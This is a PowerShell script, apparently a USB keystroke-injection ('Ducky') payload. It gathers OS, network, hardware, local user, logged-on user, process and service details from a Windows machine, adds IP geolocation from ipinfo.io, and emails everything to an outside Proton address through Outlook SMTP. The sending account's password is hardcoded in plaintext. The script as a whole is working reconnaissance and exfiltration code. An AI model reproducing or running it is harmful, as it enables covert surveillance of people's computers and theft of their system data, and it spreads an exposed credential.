Try {
	$SystemInfo = [PSCustomObject]@{
    		# Operating System and Computer System Details
    		OS_Details = Get-WmiObject -Class Win32_OperatingSystem | Select-Object Caption, Version, ServicePackMajorVersion, OSArchitecture
    		System_Details = Get-WmiObject -Class Win32_ComputerSystem | Select-Object Model, Manufacturer, SystemType, TotalPhysicalMemory

    		# Network Information
    		IP_Configuration = Get-NetIPAddress | Select-Object IPAddress, InterfaceAlias, AddressFamily
    		Network_Adapters = Get-NetAdapter | Select-Object Name, Status, MacAddress, LinkSpeed
    		DNS_Configuration = Get-DnsClientServerAddress | Select-Object InterfaceAlias, ServerAddresses

    		# Hardware Details
    		CPU_Info = Get-WmiObject -Class Win32_Processor | Select-Object Name, NumberOfCores, MaxClockSpeed
    		Disk_Info = Get-WmiObject -Class Win32_LogicalDisk | Select-Object DeviceID, VolumeName, Size, FreeSpace
    		USB_Devices = Get-WmiObject -Class Win32_USBHub | Select-Object Name, DeviceID, Status

    		# User and Security Information
    		User_Accounts = Get-LocalUser | Select-Object Name, Enabled, LastLogon
    		Logged_On_Users = quser | Out-String

    		# Process and Service Information
    		Running_Processes = Get-Process | Select-Object ProcessName, Id, CPU, WorkingSet | Sort-Object CPU -Descending
    		Services_Status = Get-Service | Select-Object Name, Status, StartType
	}

	$SystemInfoJson = $SystemInfo | ConvertTo-Json -Depth 10
	$ipInfo = Invoke-RestMethod -Uri 'http://ipinfo.io/json'
	$jsonContent = $ipInfo | ConvertTo-Json -Depth 10
	$Message = "Geolocation Data:`r`n$jsonContent`r`n`r`nSystem Information:`r`n$SystemInfoJson"
	$EmailFrom = "usulmadhi@outlook.fr"
	$EmailTo = "UsulMadhi@proton.me"
	$Subject = "Geo Data Ducky"
	$Body = $Message
	$SMTPServer = "smtp.outlook.com"
	$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
	$SMTPClient.EnableSsl = $true
	$SMTPClient.Credentials = New-Object System.Net.NetworkCredential("usulmadhi@outlook.fr", "Eusebe2000");
	$SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body)
    	Write-Host "Email sent successfully!"
}
Catch {
    	Write-Host "Error sending email: $_"
}

